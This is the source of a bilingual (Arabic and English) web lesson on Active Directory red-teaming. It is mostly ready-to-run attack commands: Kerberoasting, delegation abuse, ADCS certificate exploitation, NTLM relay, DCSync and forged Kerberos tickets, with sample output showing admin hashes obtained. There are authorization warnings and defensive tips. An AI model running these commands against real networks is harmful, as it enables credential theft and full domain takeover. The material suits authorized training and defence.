"use client";
import { LessonShell, Section, Callout, Code, Terminal, Analogy, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="advanced-ad">
      <L
        ar={<>
          <Section title="ليه Active Directory هو الجائزة الكبرى؟">
            <Analogy>
              بُص. لو دخلت شركة فيها 10 آلاف موظف، هتروح فين الأول؟
              هتفضل تكسر لاب توب موظف ورا التاني؟
              ولا هتروح للسيرفر اللي ماسك المفاتيح كلها؟
              <br/><br/>
              - طب يا حضرتك، أنا داخل بـ user عادي.. هكسر DA إزاي من غير exploit؟
              <br/><br/>
              يا مستجد. الـ DA مش بيتكسر بـ exploit. بيتكسر بـ misconfig قاعد سنين محدش فاكره. الـ Domain Controller هو مفتاح المملكة، واللي معاه Domain Admin أو الـ krbtgt هو فعلياً مالك كل جهاز وكل حساب. الدرس ده عن السكك اللي بتوصلك للمفتاح ده — مش الكلام النظري، السكك الحقيقية اللي بتشتغل في 2026.
            </Analogy>
            <Callout kind="danger" title="اللي بيحصل فعلياً">
              كل التكنيكات هنا للتطبيق في red team معاك فيه إذن رسمي مكتوب.
              تطبيقها على هدف من غير تفويض = جريمة فيدرالية. مش مزحة.
              لو حذرتك، فده مش علشان أنا مثالي — ده علشان شفت ناس راحت بيها فعلاً.
            </Callout>
            <Callout kind="warn" title="غلطات الـ junior">
              <ul>
                <li>يشغل SharpHound -c All في أول 5 دقائق ويولّع الـ EDR كله.</li>
                <li>يعمل Kerberoast على كل حساب SPN في الدومين دفعة واحدة. الـ SOC هيتفرج عليك من 4769 events.</li>
                <li>يلاقي ESC1 في الـ ADCS ويستعجل ياخد Domain Admin قبل ما يفهم القالب بيعمل إيه.</li>
                <li>ينسى يدوّر krbtgt مرتين بعد ما يخلص ويفتكر إن "اتنظفت". فاكر نفسه عمل clean-up — هو بس عمل هدنة.</li>
              </ul>
            </Callout>
          </Section>
          <Section title="ارسم شجرة الهجوم بـ BloodHound">
            <p>
              إنت داخل دومين فيه 1200 يوزر و 90 سيرفر. هتفحص كل ACL بإيدك؟
              هتقعد تكتب <code>net user /domain</code> لحد ما الشمس تطلع؟
              لا. أول حاجة بيعملها أي red teamer جوه الدومين: يرسم العلاقات.
            </p>
            <p>
              BloodHound + SharpHound بيلموا الـ ACLs والـ sessions وعضويات الجروبات كلها، وبيحولوها لجراف تقدر تمشي فيه بعينك من اليوزر بتاعك لحد Domain Admin.
              في حادثة Conti ransomware اللي اتسربت في 2021، الـ playbook بتاعهم كان حرفياً: SharpHound أول حاجة، وبعدين Cypher queries، وبعدين تنفيذ. مش عبقرية — منهجية.
            </p>
            <Terminal lines={[
              { p: "bloodhound-python -d corp.local -u user -p Pass1 -ns 10.0.0.10 -c All --zip" },
              { p: "Invoke-BloodHound -CollectionMethod All,LoggedOn,GPOLocalGroup -ZipFileName loot.zip" },
              { o: "[+] 1247 users, 92 computers, 38 GPOs collected" },
            ]} />
            <h3>استعلامات Cypher تستحق الحفظ</h3>
            <Code lang="Cypher">{`MATCH p=shortestPath((u:User {name:"ME@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p
MATCH (u:User {hasspn:true}) WHERE u.pwdlastset < (date().epochSeconds - 31536000) RETURN u.name
MATCH (u)-[:GenericAll|WriteOwner|WriteDacl]->(t) RETURN u,t`}</Code>
          </Section>
          <Section title="ترسانة هجمات Kerberos كاملة">
            <h3>1) Kerberoasting</h3>
            <Code lang="bash">{`GetUserSPNs.py corp.local/user:Pass1 -dc-ip 10.0.0.10 -request -outputfile spns.hash
hashcat -m 13100 spns.hash rockyou.txt -r rules/best64.rule`}</Code>
            <h3>2) AS-REP Roasting</h3>
            <Code lang="bash">{`GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.10
hashcat -m 18200 asrep.hash rockyou.txt`}</Code>
            <h3>3) Unconstrained Delegation</h3>
            <Code lang="bash">{`Rubeus.exe monitor /interval:1 /nowrap
SpoolSample.exe DC1 PWNED-HOST
PetitPotam.py -d corp.local -u user -p Pass1 PWNED DC1`}</Code>
            <h3>4) Constrained Delegation Abuse (S4U)</h3>
            <Code lang="bash">{`getST.py -spn cifs/target.corp.local -impersonate Administrator corp.local/svc:Pass1
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@target.corp.local`}</Code>
            <h3>5) Resource-Based Constrained Delegation (RBCD)</h3>
            <Code lang="bash">{`rbcd.py -delegate-from FAKE$ -delegate-to TARGET$ -action write corp.local/user:Pass1
addcomputer.py corp.local/user:Pass1 -computer-name FAKE$ -computer-pass Fake1
getST.py -spn cifs/TARGET.corp.local -impersonate Administrator corp.local/FAKE$:Fake1`}</Code>
          </Section>
          <Section title="ADCS — الجبهة الأحدث والأخطر (ESC1 → ESC15)">
            <p>Active Directory Certificate Services فيه قوالب شهادات سهل جداً يحصل فيها سوء تكوين. أداة Certipy بتلاقي الخروم دي وبتستغلها أوتوماتيك من غير ما تحتاج تعرق.</p>
            <Terminal lines={[
              { p: "certipy find -u user@corp.local -p Pass1 -dc-ip 10.0.0.10 -vulnerable -stdout" },
              { o: "[!] Vulnerable: VulnTemplate (ESC1) — ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU" },
              { p: "certipy req -u user@corp.local -p Pass1 -ca CORP-CA -template VulnTemplate -upn administrator@corp.local" },
              { o: "[+] Got certificate for administrator@corp.local — saved as administrator.pfx" },
              { p: "certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10" },
              { o: "[+] Got TGT and NT hash for administrator: aad3b435...:31d6cfe0d16ae..." },
            ]} />
            <h3>الـ ESC اللي هتقابلهم في الميدان</h3>
            <ul>
              <li><b>ESC1</b> — قالب بيسمح بـ SAN + Client Authentication. أنت بتطلب شهادة باسم الأدمن وخلاص.</li>
              <li><b>ESC2</b> — Any Purpose EKU أو EKU فاضي.</li>
              <li><b>ESC4</b> — GenericAll على القالب نفسه = تعدّل عليه وتحوّله لقالب ضعيف بإيدك.</li>
              <li><b>ESC8</b> — NTLM relay لواجهة CA web enrollment.</li>
              <li><b>ESC11</b> — واجهة RPC من غير EPA.</li>
              <li><b>ESC13/15</b> — جديدة، بتلعب على issuance policies والـ schema.</li>
            </ul>
          </Section>
          <Section title="Shadow Credentials — تمشي من غير ما تكسر باسورد">
            <p>لو معاك GenericWrite على حساب، تقدر تضيف له مفتاح msDS-KeyCredentialLink وتعمل مصادقة باسمه عن طريق PKINIT. الحساب باسوورده زي ما هو، إنت بس دخلت من باب جانبي.</p>
            <Code lang="bash">{`certipy shadow auto -u user@corp.local -p Pass1 -account victim`}</Code>
          </Section>
          <Section title="NTLM Relay — الهجمة اللي مش بتموت">
            <Code lang="bash">{`responder -I eth0 -wrf
ntlmrelayx.py -t ldaps://dc -smb2support --delegate-access
ntlmrelayx.py -t ldap://dc --shadow-credentials --shadow-target victim$
mitm6 -d corp.local
ntlmrelayx.py -6 -wh fake-wpad -t ldaps://dc --delegate-access`}</Code>
            <Callout kind="good" title="الحماية — Blue Team">
              <ul>
                <li>فعّل SMB Signing + LDAP Signing &amp; Channel Binding (EPA). دي البديهيات.</li>
                <li>اقفل LLMNR / NBT-NS / mDNS. مفيش مبرر سنة 2026 إنهم شغالين.</li>
                <li>اقفل IPv6 لو مش مستخدم، أو ركّب DHCPv6 guard.</li>
                <li>راقب 4624 type 3 + 4768/4769 الغريبة. الباترن هو اللي هيكشفهم.</li>
              </ul>
              اوعى تسيب LLMNR شغّال "علشان قديم وما حدش عايز يلمسه". ده اللي بيتقتلك في كل engagement.
            </Callout>
          </Section>
          <Section title="DCSync والتذاكر الذهبية والفضية والماسية">
            <Code lang="bash">{`secretsdump.py -just-dc corp.local/admin:Pass1@DC1
ticketer.py -nthash <KRBTGT_NTLM> -domain-sid S-1-5-21-... -domain corp.local administrator
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass corp.local/administrator@DC1
ticketer.py -nthash <SVC_NTLM> -spn cifs/target -domain corp.local user
Rubeus.exe diamond /tgtdeleg /ticketuser:admin /ticketuserid:500 /groups:512`}</Code>
            <Callout kind="warn" title="القاعدة الذهبية للمدافع">لما تتأكد إن الـ DC اتخرق: <b>دوّر krbtgt مرتين</b> (مرة، استنى 10 ساعات، تاني مرة). مرة واحدة مش كفاية، المهاجم لسة معاه التذكرة القديمة شغالة.</Callout>
          </Section>
          <Section title="الخلاصة الناشفة">
            <p>
              الـ AD مش بيتكسر بـ exploit واحد. بيتكسر بسلسلة قرارات إدارية اتأجلت سنين.
              <br/>
              الـ junior بيقول: "أنا عملت Kerberoast، يبقى أنا معدّي".
              <br/>
              المحترف بيقول: "أنا قعدت أرسم الجراف 4 ساعات، وعرفت إن الطريق من user عادي لـ DA طوله 3 خطوات. الباقي تنفيذ".
              <br/>
              لو إنت blue team: شغّل BloodHound على نفسك قبل المهاجم. لو لقيت طريق قصير، يبقى الفجوة موجودة. ما تنتظرش حد يثبتها لك.
              <br/><br/>
              اكتبها على سطح مكتبك:
              <br/>
              <b>كل يوم ما تشغلش BloodHound على دومينك، أنت بتتفرج مش بتدافع.</b>
            </p>
          </Section>
        </>}
        en={<>
          <Section title="Why is Active Directory the crown jewel?">
            <Analogy>The Domain Controller is the master key. Whoever owns Domain Admin or krbtgt owns every machine and account in the org. This lesson is about modern paths to that key.</Analogy>
            <Callout kind="danger" title="Warning">Every technique here is for authorized red team engagements only. Unauthorized use is a federal offense in GCC, EU, and US jurisdictions.</Callout>
          </Section>
          <Section title="Mapping the attack tree with BloodHound">
            <p>The first thing a red teamer does inside a domain is map relationships. BloodHound + SharpHound collect all ACLs, sessions, and group memberships, then graph them.</p>
            <Terminal lines={[
              { p: "bloodhound-python -d corp.local -u user -p Pass1 -ns 10.0.0.10 -c All --zip" },
              { p: "Invoke-BloodHound -CollectionMethod All,LoggedOn,GPOLocalGroup -ZipFileName loot.zip" },
              { o: "[+] 1247 users, 92 computers, 38 GPOs collected" },
            ]} />
            <h3>Useful Cypher queries</h3>
            <Code lang="Cypher">{`MATCH p=shortestPath((u:User {name:"ME@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p
MATCH (u:User {hasspn:true}) WHERE u.pwdlastset < (date().epochSeconds - 31536000) RETURN u.name
MATCH (u)-[:GenericAll|WriteOwner|WriteDacl]->(t) RETURN u,t`}</Code>
          </Section>
          <Section title="Full Kerberos attack arsenal">
            <h3>1) Kerberoasting</h3>
            <Code lang="bash">{`GetUserSPNs.py corp.local/user:Pass1 -dc-ip 10.0.0.10 -request -outputfile spns.hash
hashcat -m 13100 spns.hash rockyou.txt -r rules/best64.rule`}</Code>
            <h3>2) AS-REP Roasting</h3>
            <Code lang="bash">{`GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.10
hashcat -m 18200 asrep.hash rockyou.txt`}</Code>
            <h3>3) Unconstrained Delegation</h3>
            <Code lang="bash">{`Rubeus.exe monitor /interval:1 /nowrap
SpoolSample.exe DC1 PWNED-HOST
PetitPotam.py -d corp.local -u user -p Pass1 PWNED DC1`}</Code>
            <h3>4) Constrained Delegation Abuse (S4U)</h3>
            <Code lang="bash">{`getST.py -spn cifs/target.corp.local -impersonate Administrator corp.local/svc:Pass1
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@target.corp.local`}</Code>
            <h3>5) Resource-Based Constrained Delegation (RBCD)</h3>
            <Code lang="bash">{`rbcd.py -delegate-from FAKE$ -delegate-to TARGET$ -action write corp.local/user:Pass1
addcomputer.py corp.local/user:Pass1 -computer-name FAKE$ -computer-pass Fake1
getST.py -spn cifs/TARGET.corp.local -impersonate Administrator corp.local/FAKE$:Fake1`}</Code>
          </Section>
          <Section title="ADCS — the newest and most dangerous frontier (ESC1 → ESC15)">
            <p>Active Directory Certificate Services has certificate templates that are easy to misconfigure. Certipy detects and exploits them automatically.</p>
            <Terminal lines={[
              { p: "certipy find -u user@corp.local -p Pass1 -dc-ip 10.0.0.10 -vulnerable -stdout" },
              { o: "[!] Vulnerable: VulnTemplate (ESC1) — ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU" },
              { p: "certipy req -u user@corp.local -p Pass1 -ca CORP-CA -template VulnTemplate -upn administrator@corp.local" },
              { o: "[+] Got certificate for administrator@corp.local — saved as administrator.pfx" },
              { p: "certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10" },
              { o: "[+] Got TGT and NT hash for administrator: aad3b435...:31d6cfe0d16ae..." },
            ]} />
            <h3>The most common ESC paths</h3>
            <ul>
              <li><b>ESC1</b> — template allows SAN + Client Authentication.</li>
              <li><b>ESC2</b> — Any Purpose EKU or empty EKU.</li>
              <li><b>ESC4</b> — GenericAll over the template itself = swap it for a vulnerable one.</li>
              <li><b>ESC8</b> — NTLM relay to the CA web enrollment.</li>
              <li><b>ESC11</b> — RPC interface without EPA.</li>
              <li><b>ESC13/15</b> — newer, around issuance policies / schema.</li>
            </ul>
          </Section>
          <Section title="Shadow Credentials">
            <p>If you have GenericWrite on an account, you can add an msDS-KeyCredentialLink and authenticate as that account via PKINIT — no password cracking needed.</p>
            <Code lang="bash">{`certipy shadow auto -u user@corp.local -p Pass1 -account victim`}</Code>
          </Section>
          <Section title="NTLM Relay — the attack that won't die">
            <Code lang="bash">{`responder -I eth0 -wrf
ntlmrelayx.py -t ldaps://dc -smb2support --delegate-access
ntlmrelayx.py -t ldap://dc --shadow-credentials --shadow-target victim$
mitm6 -d corp.local
ntlmrelayx.py -6 -wh fake-wpad -t ldaps://dc --delegate-access`}</Code>
            <Callout kind="good" title="Defense">
              <ul>
                <li>Enforce SMB Signing + LDAP Signing &amp; Channel Binding (EPA).</li>
                <li>Disable LLMNR / NBT-NS / mDNS.</li>
                <li>Disable IPv6 if unused, or deploy DHCPv6 guard.</li>
                <li>Monitor abnormal 4624 type 3 + 4768/4769 events.</li>
              </ul>
            </Callout>
          </Section>
          <Section title="DCSync and Golden / Silver / Diamond Tickets">
            <Code lang="bash">{`secretsdump.py -just-dc corp.local/admin:Pass1@DC1
ticketer.py -nthash <KRBTGT_NTLM> -domain-sid S-1-5-21-... -domain corp.local administrator
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass corp.local/administrator@DC1
ticketer.py -nthash <SVC_NTLM> -spn cifs/target -domain corp.local user
Rubeus.exe diamond /tgtdeleg /ticketuser:admin /ticketuserid:500 /groups:512`}</Code>
            <Callout kind="warn" title="The defender's golden rule">After confirmed DC compromise: <b>rotate krbtgt twice</b> (rotate, wait 10 hours, rotate again). One rotation is not enough.</Callout>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
